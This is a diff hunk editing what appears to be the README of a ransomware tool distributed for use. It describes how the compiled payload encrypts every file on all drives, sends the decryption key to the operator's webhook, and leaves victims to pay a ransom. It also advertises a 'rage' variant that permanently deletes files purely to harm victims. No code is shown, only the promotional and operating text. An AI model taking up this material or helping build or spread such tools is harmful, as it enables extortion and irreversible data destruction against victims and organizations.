@@ -56,9 +56,9 @@
 
 This ransomware is a malware designed to deny a user or organization access to files on their computer. By encrypting these files and demanding a ransom payment for the decryption key, cyberattackers place organizations in a position where paying the ransom is the easiest and cheapest way to regain access to their files.
 
-The second u run the compiled payload all files from all drives will begin to encrypt meaning i am not responsible for any damages. Once all files have been encrypted on the target machine the decryption key will be sent to your webhook. After the victim have read the README then they should proceed to contact you to pay ransom demand price.
+Have you ever heard of the WannaCry Ransomware? Well, you better lock your files or it will be gone forever! The second u run the compiled payload all files from all drives will begin to encrypt meaning i am not responsible for any damages. Once all files have been encrypted on the target machine the decryption key will be sent to your webhook. After the victim have read the README then they should proceed to contact you to pay ransom demand price.
 
-The ransomware rage version is just like the normal ransomware execpt all files are instantly and permenatly deleted meaning there is no possible way to get them back, only use this payload if you are willing to not receieve any profit from the ransom attack and purley wish to make the victims life hell!
+The ransomware rage version is just like the normal ransomware except all files are instantly and permanently deleted meaning there is no possible way to get them back, only use this payload if you wish to make the victims life hell.
 
 <br>
 
